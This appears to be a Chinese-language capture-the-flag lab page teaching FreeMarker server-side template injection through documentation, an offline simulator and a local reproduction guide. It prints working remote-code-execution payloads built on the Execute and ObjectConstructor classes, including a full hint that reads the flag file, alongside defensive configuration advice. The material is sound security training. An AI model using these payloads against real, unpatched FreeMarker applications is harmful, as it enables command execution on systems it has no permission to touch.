为什么这一关是"文档化替代"

FreeMarker 是 Java 世界（Spring 生态、各类 CMS/ERP）最常见模板引擎之一，SSTI 利用价值极高。但它的运行时是 JVM——容器预算红线内存装不下（见主仓库 SPEC：Java 系一律文档替代）。所以本关交付：知识点 + 经典 payload + 离线模拟器。

下面的模拟器内置了一个"迷你 FreeMarker"：当你输入语法正确的经典 RCE payload 时，它会模拟出真实环境的执行结果并给出 flag。payload 打错就只会收到 FreeMarker 风格的报错——和真环境的学习体验一致。

知识点讲解

FreeMarker 语法速记（和前四关完全不同的一套）：

语法含义示例
${expr}插值输出${1+1} → 2
<#directive ...>指令（if/list/assign/include...）<#assign x=1>
"类全名"?new实例化任意类（漏洞核心，需 ?new 内建可用）"freemarker.template.utility.Execute"?new()
expr?api访问 Java API（2.3.26+ 默认禁）map?api.get("k")

经典 RCE payload（FreeMarker < 2.3.30 或未配置安全解析器）：

<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

它做的事：用 ?new 实例化 FreeMarker 自带的 Execute 工具类（这个类的功能就是执行系统命令），再把命令字符串传给它。其他同族打法：

载荷说明
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()> ${ob("java.lang.ProcessBuilder",["id"]).start()}反射构造任意类（部分版本可用）
<#assign cl=*.api?new ...> / ?api 系列2.3.26+ 默认禁用 ?api 内建
${"freemarker.template.utility.Execute"?new()("id")}一行流写法

版本与防御演化（重点）：FreeMarker 2.3.30 起默认把 ?new 限制在白名单（TemplateClassResolver.SAFER_RESOLVER），上面老 payload 在新版直接报错；但历史系统大量停留在旧版。根治手段：

Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER); // 或 UNRESTRICTED_RESOLVER 的反面
// 用户模板场景再加：cfg.setAPIBuiltinEnabled(false); + 输入白名单

提示 1：FreeMarker 的插值和"实例化类"语法

输出用 ${...}；指令用 <#...>。?new 内建可以把一个"类全名字符串"变成实例——这是旧版 FreeMarker SSTI 的万能起手式。

提示 2：实例化哪个类

freemarker.template.utility.Execute —— FreeMarker 自带的"执行系统命令"工具类，构造后再调用即可执行命令。

提示 3：完整 payload

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")} —— 复制进模拟器渲染，flag 就在输出里。

想跑真环境？（自建复现指引）

本机装了 JDK 的话，五分钟可以搭一个真 FreeMarker：

# 1) 下载 freemarker jar（Maven 中央仓库，或 aliyun 镜像）
curl -LO https://repo1.maven.org/maven2/org/freemarker/freemarker/2.3.29/freemarker-2.3.29.jar
# 2) 写 Demo.java（核心三行）
#    Configuration cfg = new Configuration(new Version("2.3.29"));
#    Template t = new Template("t", new StringReader(用户输入), cfg);
#    t.process(null, new StringWriter()) —— 写回响应
# 3) javac -cp freemarker-2.3.29.jar Demo.java && java -cp .:freemarker-2.3.29.jar Demo
# 把 <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")} 喂进去即可复现

再换成 2.3.32 试同一 payload，观察 ?new 被安全解析器拦截的报错——版本演化的直觉就有了。
